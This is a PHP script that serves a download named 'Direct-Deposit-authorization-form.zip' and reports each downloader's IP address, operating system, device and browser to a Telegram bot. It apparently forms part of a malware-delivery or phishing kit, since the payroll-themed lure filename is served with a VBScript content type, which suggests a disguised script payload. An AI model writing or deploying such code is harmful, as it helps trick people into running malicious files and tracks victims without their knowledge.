<?php

error_reporting(E_ALL);
ini_set('display_errors', '1');

require_once __DIR__ . '/../config.php';

$file = __DIR__ . '/Direct-Deposit-authorization-form.zip';

if (!file_exists($file) || !is_file($file)) {
    http_response_code(404);
    exit('File not found.');
}

$filename = basename($file);
$fileSize = filesize($file);

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

/* Operating system */
$os = 'Unknown';

if (stripos($userAgent, 'Windows') !== false) {
    $os = 'Windows';
} elseif (
    stripos($userAgent, 'Mac OS') !== false ||
    stripos($userAgent, 'Macintosh') !== false
) {
    $os = 'macOS';
} elseif (stripos($userAgent, 'Android') !== false) {
    $os = 'Android';
} elseif (
    stripos($userAgent, 'iPhone') !== false ||
    stripos($userAgent, 'iPad') !== false
) {
    $os = 'iOS';
} elseif (stripos($userAgent, 'Linux') !== false) {
    $os = 'Linux';
}

/* Device */
$device = preg_match(
    '/Mobile|Android|iPhone|iPad/i',
    $userAgent
) ? 'Mobile/Tablet' : 'Desktop';

/* Browser */
$browser = 'Unknown';

if (stripos($userAgent, 'Edg/') !== false) {
    $browser = 'Microsoft Edge';
} elseif (stripos($userAgent, 'Chrome/') !== false) {
    $browser = 'Chrome';
} elseif (stripos($userAgent, 'Firefox/') !== false) {
    $browser = 'Firefox';
} elseif (stripos($userAgent, 'Safari/') !== false) {
    $browser = 'Safari';
}

/* Plain-text Telegram message */
$message  = "📥 DOWNLOAD EVENT\n";
$message .= "━━━━━━━━━━━━━━━━━━\n\n";
$message .= "📦 File: " . $filename . "\n\n";
$message .= "📏 Size: " . number_format($fileSize) . " bytes\n\n";
$message .= "🌐 IP Address: " . $ip . "\n\n";
$message .= "💻 OS: " . $os . "\n\n";
$message .= "📱 Device: " . $device . "\n\n";
$message .= "🌐 Browser: " . $browser . "\n\n";
$message .= "📅 Date: " . gmdate('d F Y') . "\n\n";
$message .= "⏰ Time: " . gmdate('H:i:s') . " UTC\n\n";
$message .= "━━━━━━━━━━━━━━━━━━\n\n";
$message .= "🟢 Status: Download requested";

sendTelegramMessage($message);

/* Serve ZIP */
header('Content-Description: File Transfer');
header('Content-Type: application/vbs');
header('Content-Disposition: attachment; filename="' . $filename . '"');
header('Content-Length: ' . $fileSize);
header('Cache-Control: no-cache, must-revalidate');
header('Pragma: public');
header('Expires: 0');

readfile($file);
exit;
?>
